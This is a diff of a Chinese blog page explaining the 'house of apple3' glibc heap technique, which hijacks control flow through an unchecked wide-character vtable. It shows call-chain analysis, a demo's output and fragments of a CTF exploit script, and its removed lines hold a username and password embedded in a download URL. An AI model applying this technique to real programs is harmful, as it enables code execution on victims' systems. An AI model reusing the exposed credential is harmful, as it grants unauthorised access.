@@ -121,7 +121,7 @@ house of apple3
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -208,7 +208,7 @@ house of apple3
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -299,7 +299,7 @@ house of apple3
 </ul>
 <h2 id="利用原理">利用原理</h2>
 <p><code>stdin/stdout/stderr</code>这三个<code>_IO_FILE</code>结构体使用的是<code>_IO_file_jumps</code>这个<code>vtable</code>，而当需要调用到<code>vtable</code>里面的函数指针时，会使用宏去调用。以<code>_IO_file_overflow</code>调用为例，<code>glibc</code>中调用的代码片段分析如下</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -312,12 +312,11 @@ house of apple3
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="cp">#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="cp"># define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
-</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="cp"># define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>其中，<code>IO_validate_vtable</code>函数负责检查<code>vtable</code>的合法性，会判断<code>vtable</code>的地址是不是在一个合法的区间。如果<code>vtable</code>的地址不合法，程序将会异常终止。</p>
 <p>观察<code>struct _IO_wide_data</code>结构体，发现其对应有一个<code>_wide_vtable</code>成员。</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -364,11 +363,10 @@ house of apple3
 </span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="n">_codecvt</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">wchar_t</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">_wide_vtable</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，仍然以<code>vtable-&gt;_overflow</code>调用为例，所用到的宏依次为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -387,13 +385,12 @@ house of apple3
 </span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WIDE_JUMPS(THIS) \
-</span></span></span><span class="line"><span class="cl"><span class="cp">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable
-</span></span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="cp">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到，在调用<code>_wide_vtable</code>里面的成员函数指针时，<strong>没有关于vtable的合法性检查</strong>。</p>
 <p>因此，我们可以劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p>
 <p>以下面提到的<code>_IO_wdefault_xsgetn</code>函数利用为例，编写<code>demo</code>示例如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -514,11 +511,10 @@ house of apple3
 </span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] step 8: call fflush(stderr) to trigger backdoor func&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>编译后输出：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -549,8 +545,7 @@ house of apple3
 </span></span><span class="line"><span class="cl">[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base
 </span></span><span class="line"><span class="cl">[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow
 </span></span><span class="line"><span class="cl">[+] step 8: call fflush(stderr) to trigger backdoor func
-</span></span><span class="line"><span class="cl">[!] Backdoor is called!
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">[!] Backdoor is called!</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到，成功调用了后门函数。</p>
 <h2 id="利用思路">利用思路</h2>
@@ -568,7 +563,7 @@ house of apple3
 <li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
 </ul>
 <p>函数的调用链如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -579,12 +574,11 @@ house of apple3
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_IO_wfile_overflow
 </span></span><span class="line"><span class="cl">    _IO_wdoallocbuf
 </span></span><span class="line"><span class="cl">        _IO_WDOALLOCATE
-</span></span><span class="line"><span class="cl">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>详细分析如下：
 首先看<code>_IO_wfile_overflow</code>函数</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -627,12 +621,11 @@ house of apple3
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// ......
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>需要满足<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>
 <p>然后看<code>_IO_wdoallocbuf</code>函数：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -659,8 +652,7 @@ house of apple3
 </span></span><span class="line"><span class="cl">  <span class="nf">_IO_wsetb</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_shortbuf</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">		     <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_shortbuf</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_wdoallocbuf</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_wdoallocbuf</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>需要满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base != 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p>
 <h3 id="利用_io_wfile_underflow_mmap函数控制程序执行流">利用_IO_wfile_underflow_mmap函数控制程序执行流</h3>
@@ -677,7 +669,7 @@ house of apple3
 <li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
 </ul>
 <p>函数的调用链如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-9"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -688,12 +680,11 @@ house of apple3
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_IO_wfile_underflow_mmap
 </span></span><span class="line"><span class="cl">    _IO_wdoallocbuf
 </span></span><span class="line"><span class="cl">        _IO_WDOALLOCATE
-</span></span><span class="line"><span class="cl">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>详细分析如下：
 看<code>_IO_wfile_underflow_mmap</code>函数：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-10"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -776,8 +767,7 @@ house of apple3
 </span></span><span class="line"><span class="cl">      <span class="nf">_IO_wdoallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span><span class="c1">// 需要走到这里
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">//......
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code>fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p>
 <h3 id="利用_io_wdefault_xsgetn函数控制程序执行流">利用_IO_wdefault_xsgetn函数控制程序执行流</h3>
@@ -794,7 +784,7 @@ house of apple3
 <li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
 </ul>
 <p>函数的调用链如下：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-11"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -807,12 +797,11 @@ house of apple3
 </span></span><span class="line"><span class="cl">    __wunderflow
 </span></span><span class="line"><span class="cl">        _IO_switch_to_wget_mode
 </span></span><span class="line"><span class="cl">            _IO_WOVERFLOW
-</span></span><span class="line"><span class="cl">                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>详细分析如下：
 首先看<code>_IO_wdefault_xsgetn</code>函数：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-12"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -889,14 +878,13 @@ house of apple3
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">more</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_wdefault_xsgetn</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_wdefault_xsgetn</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>由于<code>more</code>是第三个参数，所以不能为<code>0</code>。
 直接设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支。
 随后当<code>more != 0</code>时会进入<code>__wunderflow</code>。</p>
 <p>接着看<code>__wunderflow</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-13"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -925,12 +913,11 @@ house of apple3
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// ......
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>要想调用到<code>_IO_switch_to_wget_mode</code>，需要设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p>
 <p>然后在<code>_IO_switch_to_wget_mode</code>函数中：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-14"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -949,15 +936,14 @@ house of apple3
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="kt">wint_t</span><span class="p">)</span><span class="nf">_IO_WOVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">WEOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">WEOF</span><span class="p">)</span> <span class="c1">// 需要走到这里
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// .....
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时就会调用<code>_IO_WOVERFLOW(fp)</code>。</p>
 <h2 id="例题分析">例题分析</h2>
 <p>仍然以<code>house of apple1</code> 中的<code>pwn_oneday</code>为例。</p>
 <p>程序的详细分析就不在此赘述。为了方便展示利用效果，后面的<code>rop</code>部分就不做了，我们利用本篇文章提出的方法输出<code>  hack!</code>字符串。</p>
 <p>在<code>largebin attack</code>攻击<code>_IO_list_all</code>之后，伪造<code>_IO_FILE</code>结构：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-15"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -984,11 +970,10 @@ house of apple3
 </span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0xa81</span>
 </span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">_lock</span>
 </span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span> <span class="o">+</span> <span class="mh">0xe0</span>
-</span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">_IO_wfile_jumps</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">f1</span><span class="o">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">_IO_wfile_jumps</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>所以最后的<code>exp</code>为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-16"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -1221,8 +1206,7 @@ house of apple3
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl"><span class="n">bye</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"> 
-</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>调试如下：
 通过<code>exit</code>执行到<code>_IO_wdoallocbuf</code>：
